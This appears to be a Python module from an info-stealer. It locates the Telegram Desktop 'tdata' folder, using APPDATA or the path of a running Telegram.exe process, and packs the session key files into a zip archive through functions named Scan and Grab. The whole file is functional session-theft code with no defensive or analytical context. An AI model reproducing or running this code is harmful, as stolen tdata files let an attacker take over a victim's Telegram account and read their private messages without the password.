
# Import modules
import os
import zipfile
from psutil import process_iter

__files = [
	"D877F783D5D3EF8Cs",
	"D877F783D5D3EF8C\\maps"
	]

""" Get telegram tdata directory """
def Scan():
	tdata = os.path.join(os.getenv("appdata"), "Telegram Desktop\\tdata")
	# Find tdata directory by telegram process
	if not os.path.exists(tdata):
		for process in process_iter():
			if process.name() == "Telegram.exe":
				tdata = os.path.join(os.path.dirname(process.exe()), "tdata")
	return tdata

""" Grab telegram session files """
def Grab(archivePath="tdata.zip", telegramDir=Scan()):
	# Check if exists
	if not os.path.exists(telegramDir):
		return None
	# Get current path
	curpath = os.getcwd()
	# Create archive
	with zipfile.ZipFile(archivePath, 'w', zipfile.ZIP_DEFLATED) as archive:
		os.chdir(telegramDir)
		# Write files
		for file in __files:
			if os.path.exists(file):
				archive.write(file, os.path.join("tdata", file))
	os.chdir(curpath)
	return archivePath
